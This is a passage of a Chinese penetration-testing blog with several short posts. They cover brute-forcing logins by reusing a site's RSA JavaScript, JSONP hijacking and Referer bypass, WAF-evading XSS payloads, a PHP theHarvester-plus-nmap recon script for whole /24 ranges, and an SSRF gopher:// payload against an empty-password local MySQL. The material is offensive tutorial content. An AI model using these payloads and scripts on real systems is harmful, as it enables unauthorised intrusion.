class="string">'Server running at http://127.0.0.1:8881/'</span>);</span><br></pre></td></tr></table></figure>
<p>这样就是起了一个web服务，然后我们在发包的代码中直接调用就行了。<br>我们还是要能看懂些加密过程，然后利用nodejs包含进来。<br>比如说网站js加密的函数是这么写的。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">any_rsa_pass</span>(<span class="params">pubkey,pass</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> key = RSA.getPublicKey(pubkey);</span><br><span class="line">	<span class="keyword">return</span> RSA.encrypt(pass, key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>那么我们就在该js文件下加入<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = any_rsa_pass;</span><br></pre></td></tr></table></figure></p>
<p>然后写个python，调用该js文件，发包爆破就可以了。<br>ps: 调试js，下载一个supervisor</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yangge.me/2018/05/15/jsonp劫持/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="yangge">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="https://i.loli.net/2018/01/29/5a6ec351ca6e7.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/05/15/jsonp劫持/" itemprop="url">jsonp劫持</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-05-15T10:31:57+08:00">
                2018-05-15
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/05/15/jsonp劫持/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count"
                        data-disqus-identifier="2018/05/15/jsonp劫持/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <ul>
<li>jsonp主要是解决跨域的问题</li>
<li>jsonp劫持的本质是CSRF</li>
<li>但是可能有xss问题</li>
</ul>
<p>查找这类问题，首先要看几点</p>
<h6 id="1-contant-type"><a href="#1-contant-type" class="headerlink" title="1. contant-type"></a>1. contant-type</h6><ul>
<li>contant-type 是否严格定义了Content-Type: application/json，如果不是，极有可能造成xss问题，有一些人可能会写成application/javascript  而这个头在 IE 等浏览器下一样可以解析 HTML 导致 XSS 漏洞</li>
</ul>
<h6 id="2-Referer"><a href="#2-Referer" class="headerlink" title="2. Referer"></a>2. Referer</h6><ul>
<li>删除referer是否可以正常访问,造成csrf漏洞，referer是否可以绕过？比如正常的referer是<a href="http://baidu.com?id=2222,如果我写成http://baidu.com.sss.com?id=2222或者http://ssss.com?baidu.com?id=2222，正则写的有问题的话，就可以绕过referer从而造成csrf。" target="_blank" rel="noopener">http://baidu.com?id=2222,如果我写成http://baidu.com.sss.com?id=2222或者http://ssss.com?baidu.com?id=2222，正则写的有问题的话，就可以绕过referer从而造成csrf。</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yangge.me/2018/02/11/渗透测试中xss验证方式/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="yangge">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="https://i.loli.net/2018/01/29/5a6ec351ca6e7.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/02/11/渗透测试中xss验证方式/" itemprop="url">渗透测试中xss验证方式</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-02-11T16:48:13+08:00">
                2018-02-11
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/02/11/渗透测试中xss验证方式/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count"
                        data-disqus-identifier="2018/02/11/渗透测试中xss验证方式/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>有一些站点可以使用’或者“等闭合，但是有时候验证非常困难，因为waf会把各种关键字拦截，从而我们无法进行危害验证，我给大家说一个方式进行验证。<br>例如漏洞源代码是这么写的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  var ss = &apos;222&apos;;</span><br><span class="line">  var dd = &apos;333&apos;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>其中ss是可控参数，那么我们就可以想到的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:&apos;;alert(1);//</span><br></pre></td></tr></table></figure></p>
<p>但是后面的关键字是会被waf拦截的，提供一种验证方式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload：document.write(location.href);</span><br><span class="line"></span><br><span class="line">		 document.write(location.pathname);</span><br></pre></td></tr></table></figure></p>
<p>前者返回当前页面整个url，后者为返回当前url路径名。<br>比如有些没有屏蔽一些合并字符的函数，那么我们就可以<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&apos;ale&apos;.concat(&apos;rt&apos;,&apos;(1)&apos;);</span><br></pre></td></tr></table></figure></p>
<p>或者join函数都是一样的。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yangge.me/2018/01/26/自动扫描域名-c段扫描脚本/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="yangge">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="https://i.loli.net/2018/01/29/5a6ec351ca6e7.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/01/26/自动扫描域名-c段扫描脚本/" itemprop="url">自动扫描域名+c段扫描脚本</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-01-26T16:31:41+08:00">
                2018-01-26
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/01/26/自动扫描域名-c段扫描脚本/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count"
                        data-disqus-identifier="2018/01/26/自动扫描域名-c段扫描脚本/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>没事儿干写个自动扫描二级域名和c段的小东西。<br>url收集使用的是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">theharvester</span><br></pre></td></tr></table></figure></p>
<p>端口扫描调用的是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap</span><br></pre></td></tr></table></figure></p>
<p>脚本如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">        print_r(&quot;            _ _           _                                              </span><br><span class="line">           | | |         | |                                             </span><br><span class="line">   ___ ___ | | | ___  ___| |_   _ __ ___   ___  ___ ___  __ _  __ _  ___ </span><br><span class="line">  / __/ _ \| | |/ _ \/ __| __| | &apos;_ ` _ \ / _ \/ __/ __|/ _` |/ _` |/ _ \</span><br><span class="line"> | (_| (_) | | |  __/ (__| |_  | | | | | |  __/\__ \__ \ (_| | (_| |  __/</span><br><span class="line">  \___\___/|_|_|\___|\___|\__| |_| |_| |_|\___||___/___/\__,_|\__, |\___|</span><br><span class="line">                                                               __/ |     </span><br><span class="line">                                                              |___/      </span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">                         使用方式</span><br><span class="line">        进行企业url收集，自动进行端口扫描，并进行C段自动扫描</span><br><span class="line">                php collect_message.php 企业域名</span><br><span class="line">                         example</span><br><span class="line">                php collect_message.php baidu.com</span><br><span class="line">                         yangge</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">                                                            &quot;);</span><br><span class="line">      </span><br><span class="line">        if(isset($argv[1]))</span><br><span class="line">        &#123;</span><br><span class="line">        #把url找出来</span><br><span class="line">        $yuming = $argv[1];</span><br><span class="line">	exec(&quot;python theHarvester.py -d &quot; . $yuming . &quot; -b all -l 500 -s 300 &gt; &quot; . $yuming);</span><br><span class="line">        $fp = fopen($yuming,&quot;r&quot;);</span><br><span class="line">        $fr = fread($fp,filesize($yuming));</span><br><span class="line">        $find_url = explode(&quot;[-] Resolving hostnames IPs...&quot;, $fr);</span><br><span class="line">        $find_url_get = $find_url[1];</span><br><span class="line">        $find_url_get_1 = explode(&quot;[+] Virtual hosts:&quot;, $find_url_get);</span><br><span class="line">        $findurl = $find_url_get_1[0];</span><br><span class="line">        $ss = explode(&quot;\n&quot;,$findurl);</span><br><span class="line">        $add_array = array();</span><br><span class="line">        for($i=1;$i&lt;count($ss)-1;$i++)</span><br><span class="line">        &#123;</span><br><span class="line">            $dd = $ss[$i];</span><br><span class="line">            $gg = explode(&quot;:&quot;, $dd);</span><br><span class="line">            $c_ip = explode(&quot;.&quot;,$gg[0]);</span><br><span class="line">            $c_ip1 = $c_ip[0].&quot;.&quot;.$c_ip[1].&quot;.&quot;.$c_ip[2];   </span><br><span class="line">            array_push($add_array,$c_ip1);</span><br><span class="line">        &#125;</span><br><span class="line">        $unique_array = array_unique($add_array);</span><br><span class="line">        $get_c = fopen(&quot;c_ip.txt&quot;, &quot;w&quot;);</span><br><span class="line">        for($i=0;$i&lt;count($unique_array);$i++)</span><br><span class="line">        &#123;</span><br><span class="line">	    if(isset($unique_array[$i]))</span><br><span class="line">	    &#123;</span><br><span class="line">            	$t = $unique_array[$i];</span><br><span class="line">              fwrite($get_c, $t.&quot;/24&quot;);</span><br><span class="line">	    &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">         #nmap进行扫描</span><br><span class="line">        $f_open = fopen(&quot;iplist.txt&quot;,&quot;w&quot;);</span><br><span class="line">        for($i=1;$i&lt;count($ss);$i++)</span><br><span class="line">        &#123;</span><br><span class="line">            $tt = $ss[$i];</span><br><span class="line">            $aa = explode(&quot;:&quot;, $tt);</span><br><span class="line">            fwrite($f_open,$aa[0].&quot;\r\n&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">	exec(&quot;sudo nmap -sS -T4 -sV -Pn -p23,22,80,443,445,873,3128,3306,1433,4848,4440,6082,6379,7001,7021,7080,7474,7755,7766,7888,8060,8880,8000,8881,8008,8080,8081,8087,8443,8090,8099,8088,8882,8883,8884,8885,8886,8887,8888,9043,9080,9090,9200,10000,18080,11211,27017,50000 -iL iplist.txt -oN iplist_port.txt&quot;);</span><br><span class="line">  exec(&quot;sudo nmap -sS -T4 -sV -Pn -p23,22,80,443,445,873,3128,3306,1433,4848,4440,6082,6379,7001,7021,7080,7474,7755,7766,7888,8060,8880,8000,8881,8008,8080,8081,8087,8443,8090,8099,8088,8882,8883,8884,8885,8886,8887,8888,9043,9080,9090,9200,10000,18080,11211,27017,50000 -iL c_ip.txt -oN c_ip.txt&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">  echo &quot;\r\n\r\n\r\n\r\n请输入域名！！！&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>脚本直接放到theharvester的根目录下就可以运行。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yangge.me/2018/01/26/ssrf-本地MySQL空密码的利用/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="yangge">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="https://i.loli.net/2018/01/29/5a6ec351ca6e7.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/01/26/ssrf-本地MySQL空密码的利用/" itemprop="url">ssrf+本地MySQL空密码的利用</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-01-26T14:53:43+08:00">
                2018-01-26
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/01/26/ssrf-本地MySQL空密码的利用/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count"
                        data-disqus-identifier="2018/01/26/ssrf-本地MySQL空密码的利用/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>首先我们要在本地进行利用wireshark抓取一下mysql空密码的数据包。<br>mysql要使用TCP/IP协议进行连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h127.0.0.1 -uroot</span><br></pre></td></tr></table></figure></p>
<p>然后使用tcpdump进行抓取数据包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump –i lo port 3306 –w mysql.pcay</span><br></pre></td></tr></table></figure>
<p>对抓取到的数据包进行查看，使用wireshark查看<br><img src="https://i.loli.net/2018/01/26/5a6ad2dcacfd0.png" alt=""><br>查看一条数据，数据查看方式选择TCP流，选择方式如下图<br><img src="https://i.loli.net/2018/01/26/5a6ad4e079521.png" alt=""><br>这个数据然后再进行因为是tcp流的，我们需要对其进行每两个字符添加%进行url编码，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url = &quot;a800000185a6ff0100000001210000000000000000000000000000000000000000000000757365726e6f7061737300006d7973716c5f6e61746976655f70617373776f72640065035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f70696404333630390f5f636c69656e745f76657273696f6e06352e372e3231095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d697420310100000001&quot;;</span><br><span class="line">for($i=0;$i&lt;=strlen($url);$i=$i+3)</span><br><span class="line">&#123;</span><br><span class="line">	$url = substr_replace($url,&apos;%&apos;,$i,0);</span><br><span class="line">&#125;</span><br><span class="line">$url_gopher = &quot;gopher://127.0.0.1:3306/_&quot; . $url;</span><br><span class="line">echo $url_gopher . &quot;\r\n&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>然后进行利用<br><img src="https://i.loli.net/2018/01/26/5a6ad4e07add5.png" alt=""></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  


          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="https://i.loli.net/2018/01/29/5a6ec351ca6e7.jpg"
                alt="yangge" />
            
              <p class="site-author-name" itemprop="name">yangge</p>
              <p class="site-description motion-element" itemprop="description">一束光照进了铁塔，塔里的肮脏龌龊被显现，这束光便有了罪。</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">10</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/yang8e/" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:470818631@qq.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-qq"></i>E-Mail</a>
                  </span>
                
            </div>
          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yangge</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  

    
      <script id="dsq-count-scr" src="https://yangge.disqus.com/count.js" async></script>
    

    

  




	





  














  





  

  

  

  
  

  

  

  

</body>
</html>
